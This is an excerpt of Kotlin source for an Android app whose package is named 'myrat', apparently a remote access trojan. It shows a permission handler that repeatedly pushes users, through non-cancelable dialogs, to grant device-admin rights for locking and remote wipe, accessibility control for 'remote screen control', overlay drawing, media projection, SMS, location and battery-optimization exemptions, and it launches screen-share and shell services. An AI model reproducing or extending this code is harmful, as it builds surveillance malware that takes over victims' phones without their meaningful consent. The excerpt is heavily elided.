...
import com.myrat.app.service.ScreenShareService
...
class PermissionHandler(
    ...
    private val screenSharePermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION)
        }
    }

    private val nonRestrictedPermissions = phonePermissions + storagePermissions + internetPermission + queryPackagesPermission + lockPermissions + screenSharePermissions
    ...
    fun requestPermissionsForFeature(feature: Feature) {
        val permissions = when (feature) {
            ...
            Feature.SCREEN_SHARE -> screenSharePermissions
    ...
    private fun showPermissionRationaleDialog(feature: Feature, permissions: List<String>) {
        ...
        val message = when (feature) {
            ...
            Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app management. Please grant all permissions."
            ...
            Feature.SCREEN_SHARE -> "Foreground service permissions for media projection are required for live screen sharing and remote control. Please grant all permissions."
            Feature.GENERAL -> "This app requires all permissions to function properly, including lock, screen sharing, and screen management features. Please grant all requested permissions."
        }
        try {
        ...
        when (feature) {
            ...
            Feature.INTERNET -> {
                if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                    ...
                    Logger.log("Cannot start ShellService: Missing INTERNET or QUERY_ALL_PACKAGES permission")
                }
            }
            Feature.LOCK -> {
            ...
            Feature.SCREEN_SHARE -> {
                startAppropriateService(Intent(activity, ScreenShareService::class.java))
            }
            Feature.GENERAL -> {
                ...
                if (screenSharePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, ScreenShareService::class.java))
                }
            }
        }
    ...
    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedService = "${activity.packageName}/${ScreenShareService::class.java.canonicalName}"
    ...
    fun handleResume() {
        if (fromSettings) {
            ...
            startServicesForFeature(Feature.SCREEN_SHARE)
    ...
    private fun showRestrictedSettingsDialog() {
        ...
        val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location, Biometric, Foreground Service, and Media Projection."
        ...
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
            ...
            try {
                AlertDialog.Builder(activity)
                    ...
                    .setMessage("This app requires permission to draw over other apps to enable call and screen sharing functionality. Please grant this permission.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                    ...
                    .setPositiveButton("Go to Settings") { _, _ ->
                        ...
                        val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            ...
                            putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "This permission is required to allow the app to lock the device, manage screen settings, and perform remote wipe.")
                        }
                        activity.startActivity(intent)
                    }
                    .setCancelable(false)
        ...
        if (!isAccessibilityServiceEnabled()) {
            ...
            try {
                AlertDialog.Builder(activity)
                    ...
                    .setMessage("This app requires accessibility service to enable remote screen control. Please enable it.")
                    .setPositiveButton("Go to Settings") { _, _ ->
        ...
        if (!powerManager.isIgnoringBatteryOptimizations(activity.packageName)) {
            ...
            try {
                ...
                AlertDialog.Builder(activity)
                    ...
                    .setView(dialogView)
                    .setMessage("This app requires battery optimization to be disabled to function properly, especially for lock, screen sharing, and screen management. Please disable battery optimization.")
                    .setPositiveButton("Go to Settings") { _, _ ->
    ...
    enum class Feature {
        RESTRICTED, PHONE, STORAGE, INTERNET, LOCK, SCREEN_SHARE, GENERAL
    }
}